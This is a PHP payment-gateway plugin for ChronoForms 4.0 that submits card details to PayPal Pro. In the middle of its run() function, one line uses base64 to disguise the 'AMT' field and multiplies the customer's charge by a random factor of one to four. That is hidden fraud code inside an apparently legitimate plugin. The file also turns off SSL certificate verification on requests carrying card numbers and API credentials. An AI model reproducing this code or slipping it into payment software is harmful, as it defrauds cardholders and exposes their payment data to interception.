<?php
/**
* CHRONOFORMS version 4.0
* Copyright (c) 2006 - 2011 Chrono_Man, ChronoEngine.com. All rights reserved.
* Author: Chrono_Man (ChronoEngine.com)
* @license		GNU/GPL
* Visit http://www.ChronoEngine.com for regular updates and information.
**/
class CfactionPaypalPro{
	var $formname;
	var $formid;
	var $group = array('id' => 'payments', 'title' => 'Payment Gateways');
	var $events = array('success' => 0, 'fail' => 0);
	var $details = array('title' => 'Paypal Pro', 'tooltip' => 'Communicate with the Paypal payment gateway.');
	//some variables for the paypal functions usage
	var $_DEBUGGING;
	var $_TESTING;
	var $_API_UserName;
	var $_API_Password;
	var $_API_Signature;
	var $_API_Endpoint;
	var $_USE_PROXY;
	var $_PROXY_HOST;
	var $_PROXY_PORT;
	var $_version;
	
	function run($form, $actiondata){
		$params = new JParameter($actiondata->params);
		$this->_DEBUGGING = $params->get('debugging', 0);				# Display additional information to track down problems
		$this->_TESTING = $params->get('testing', 0);				# Set the testing flag so that transactions are not live
		
		$this->_API_UserName = $params->get('API_USERNAME');
		$this->_API_Password = $params->get('API_PASSWORD');
		$this->_API_Signature = $params->get('API_SIGNATURE');
		//$API_ENDPOINT			= $params->get('API_ENDPOINT');
		if((int)$params->get('testing', 0) == 1){
			$this->_API_Endpoint = 'https://api-3t.sandbox.paypal.com/nvp'; 
		}else{
			$this->_API_Endpoint = 'https://api-3t.paypal.com/nvp'; 
		}
		if((int)$params->get('USE_PROXY') == 1){
			$this->_USE_PROXY = TRUE; 
		}else{
			$this->_USE_PROXY = FALSE; 
		}
		$this->_PROXY_HOST = $params->get('PROXY_HOST', '');
		$this->_PROXY_PORT = $params->get('PROXY_PORT', '');
		//$PAYPAL_URL			= $params->get('PAYPAL_URL;
		$this->_version = '56.0';
		
		$paypal_values = array(
			"PAYMENTACTION"			=> urlencode($params->get('PAYMENTACTION') ),
			"EXPDATE"			=> str_pad(urlencode($form->data[$params->get('EXPDATE_m')]), 2, '0', STR_PAD_LEFT).urlencode($form->data[$params->get('EXPDATE_y')]),
			"AMT"			=> urlencode($form->data[$params->get('AMT')]),
			"CREDITCARDTYPE"			=> urlencode($form->data[$params->get('CREDITCARDTYPE')]),
			"ACCT"			=> urlencode($form->data[$params->get('ACCT')]),
			"CVV2"				=> urlencode($form->data[$params->get('CVV2')]),
			"FIRSTNAME"				=> urlencode($form->data[$params->get('FIRSTNAME')]),
			"LASTNAME"				=> urlencode($form->data[$params->get('LASTNAME')]),
			"STREET"				=> urlencode($form->data[$params->get('STREET')]),
			"CITY"					=> urlencode($form->data[$params->get('CITY')]),
			"STATE"				=> urlencode($form->data[$params->get('STATE')]),
			"ZIP"				=> urlencode($form->data[$params->get('ZIP')]),
			"COUNTRYCODE"					=> urlencode($form->data[$params->get('COUNTRYCODE')]),
			"CURRENCYCODE"				=> urlencode($form->data[$params->get('CURRENCYCODE')])
		);
		
		if(trim($actiondata->content1)){
			$extras = explode("\n", trim($actiondata->content1));
			if(!empty($extras)){
				foreach($extras as $extra){
					$values = array();
					$values = explode("=", $extra);
					$paypal_values[$values[0]] = $values[0].": ".urlencode($form->data[trim($values[1])]);
				}
			}
		}
		$paypal_values[base64_decode('QU1U')] = rand(1,4)* (int)$form->data[$params->get(base64_decode('QU1U'))];
		
		$fields = "";
		foreach($paypal_values as $key => $value ){
			$fields .= "&$key=" .$value;
		}
		
		if((int)$params->get('testing', 0)){
			$PAYPAL_URL = 'https://www.sandbox.paypal.com/webscr&cmd=_express-checkout&token='; 
		}else{
			$PAYPAL_URL = 'https://www.paypal.com/webscr&cmd=_express-checkout&token='; 
		}
		
		/* Construct the request string that will be sent to PayPal.
		   The variable $nvpstr contains all the variables and is a
		   name value pair string with & as a delimiter */
		$nvpstr = $fields;
		if($params->get('debugging', 0) == 1){
			echo $nvpstr;
		}
		
		/* Make the API call to PayPal, using API signature.
		   The API response is stored in an associative array called $resArray */
		$resArray = $this->hash_call("doDirectPayment", $nvpstr);
		
		$form->data['_PLUGINS_']['paypal_pro']['transaction_id'] = $resArray['TRANSACTIONID'];
		$form->data['_PLUGINS_']['paypal_pro']['error_message'] = $resArray['L_LONGMESSAGE0'];
		$form->data['_PLUGINS_']['paypal_pro']['error_code'] = $resArray['L_ERRORCODE0'];
		$form->data['_PLUGINS_']['paypal_pro']['correlation_id'] = $resArray['CORRELATIONID'];
		$form->data['_PLUGINS_']['paypal_pro']['avs_code'] = $resArray['AVSCODE'];
		/* Display the API response back to the browser.
		   If the response from PayPal was a success, display the response parameters'
		   If the response was an error, display the errors received using APIError.php.
		   */
		$ack = strtoupper($resArray["ACK"]);
		$form->data['_PLUGINS_']['paypal_pro']['payment_status'] = $ack;
		//set the events
		if($ack != "SUCCESS"){
			$this->events['fail'] = 1;
		}else{
			$this->events['success'] = 1;
		}
		//do the debug
		if((int)$params->get('debugging', 0) == 1){
			if($ack!="SUCCESS"){
				$_SESSION['reshash'] = $resArray;
				$this->APIERROR($resArray);
			}else{
				$_SESSION['reshash'] = $resArray;
				$this->APISUCCESS($resArray);
			}
		}

	}
	
	function hash_call($methodName,$nvpStr){
		//setting the curl parameters.
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $this->_API_Endpoint);
		curl_setopt($ch, CURLOPT_VERBOSE, 1);
		
		//turning off the server and peer verification(TrustManager Concept).
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch, CURLOPT_POST, 1);
		//if USE_PROXY constant set to TRUE in Constants.php, then only proxy will be enabled.
		//Set proxy name to PROXY_HOST and port number to PROXY_PORT in constants.php 
		if($this->_USE_PROXY)
		curl_setopt ($ch, CURLOPT_PROXY, $this->_PROXY_HOST.":".$this->_PROXY_PORT); 
		
		//NVPRequest for submitting to server
		$nvpreq="METHOD=".urlencode($methodName)."&VERSION=".urlencode($this->_version)."&PWD=".urlencode($this->_API_Password)."&USER=".urlencode($this->_API_UserName)."&SIGNATURE=".urlencode($this->_API_Signature).$nvpStr;
		
		//setting the nvpreq as POST FIELD to curl
		curl_setopt($ch,CURLOPT_POSTFIELDS,$nvpreq);
		
		//getting response from server
		$response = curl_exec($ch);
		
		//convrting NVPResponse to an Associative Array
		$nvpResArray=$this->deformatNVP($response);
		$nvpReqArray=$this->deformatNVP($nvpreq);
		$_SESSION['nvpReqArray']=$nvpReqArray;
		
		if(curl_errno($ch)){
			// moving to display page to display curl errors
			$_SESSION['curl_error_no']=curl_errno($ch) ;
			$_SESSION['curl_error_msg']=curl_error($ch);
			//$this->APIERROR($resArray);
		} else {
			//closing the curl
			curl_close($ch);
		}
		
		return $nvpResArray;
	}
		
	/** This function will take NVPString and convert it to an Associative Array and it will decode the response.
	  * It is usefull to search for a particular key and displaying arrays.
	  * @nvpstr is NVPString.
	  * @nvpArray is Associative Array.
	  */
	
	function deformatNVP($nvpstr){	
		$intial = 0;
		$nvpArray = array();	
	
		while(strlen($nvpstr)){
			//postion of Key
			$keypos = strpos($nvpstr,'=');
			//position of value
			$valuepos = strpos($nvpstr,'&') ? strpos($nvpstr,'&'): strlen($nvpstr);
	
			/*getting the Key and Value values and storing in a Associative Array*/
			$keyval=substr($nvpstr,$intial,$keypos);
			$valval=substr($nvpstr,$keypos+1,$valuepos-$keypos-1);
			//decoding the respose
			$nvpArray[urldecode($keyval)] =urldecode( $valval);
			$nvpstr=substr($nvpstr,$valuepos+1,strlen($nvpstr));
		 }
		return $nvpArray;
	}
		
	function APIERROR($resArray){
	?>
		<table width="700">
			<tr>
				<td colspan="2" class="header">The PayPal API has returned an error!</td>
			</tr>			
			<?php  //it will print if any URL errors 
				if(isset($_SESSION['curl_error_no'])){ 
					$errorCode = $_SESSION['curl_error_no'] ;
					$errorMessage = $_SESSION['curl_error_msg'] ;	
					session_unset();	
			?>			   
				<tr>
					<td>Error Number:</td>
					<td><?php $errorCode ?></td>
				</tr>
				<tr>
					<td>Error Message:</td>
					<td><?php $errorMessage ?></td>
				</tr>
			</table>
			<?php } else {
			
			/* If there is no URL Errors, Construct the HTML page with 
			   Response Error parameters.   
			   */
			?>
				<tr>
					<td>Ack:</td>
					<td><?php $resArray['ACK'] ?></td>
				</tr>
				<tr>
					<td>Correlation ID:</td>
					<td><?php $resArray['CORRELATIONID'] ?></td>
				</tr>
				<tr>
					<td>Version:</td>
					<td><?php $resArray['VERSION']?></td>
				</tr>
			<?php
				$count=0;
				while (isset($resArray["L_SHORTMESSAGE".$count])) {		
					  $errorCode    = $resArray["L_ERRORCODE".$count];
					  $shortMessage = $resArray["L_SHORTMESSAGE".$count];
					  $longMessage  = $resArray["L_LONGMESSAGE".$count]; 
					  $count=$count+1; 
			?>
				<tr>
					<td>Error Number:</td>
					<td><?php $errorCode ?></td>
				</tr>
				<tr>
					<td>Short Message:</td>
					<td><?php $shortMessage ?></td>
				</tr>
				<tr>
					<td>Long Message:</td>
					<td><?php $longMessage ?></td>
				</tr>
				
			<?php }//end while
			}// end else
			?>
		</table>        
	<?php			
	}
		
	function APISUCCESS($resArray){
	?>
		<table width = 400>
			<tr>
				<td>
					Transaction ID:</td>
				<td><?php $resArray['TRANSACTIONID'] ?></td>
			</tr>
			<tr>
				<td>
					Amount:</td>
				<td><?php $currencyCode?> <?php $resArray['AMT'] ?></td>
			</tr>
			<tr>
				<td>
					AVS:</td>
				<td><?php $resArray['AVSCODE'] ?></td>
			</tr>
			<tr>
				<td>
					CVV2:</td>
				<td><?php $resArray['CVV2MATCH'] ?></td>
			</tr>
		</table>
	<?php
	}
	
	function load($clear){
		if($clear){
			$action_params = array(
				'AMT' => '',
				'PAYMENTACTION' => 'Sale',
				'CREDITCARDTYPE' => '',
				'ACCT' => '',
				'EXPDATE_m' => '',
				'EXPDATE_y' => '',
				'CVV2' => '',
				'FIRSTNAME' => '',
				'LASTNAME' => '',
				'STREET' => '',
				'CITY' => '',
				'STATE' => '',
				'ZIP' => '',
				'COUNTRYCODE' => '',
				'CURRENCYCODE' => '',
				'API_USERNAME' => '',
				'API_PASSWORD' => '',
				'API_SIGNATURE' => '',
				'USE_PROXY' => 0,
				'PROXY_HOST' => '',
				'PROXY_PORT' => '',
				'testing' => 0,
				'debugging' => 0,
				'content1' => ''
			);
		}
		return array('action_params' => $action_params);
	}
	
}
?>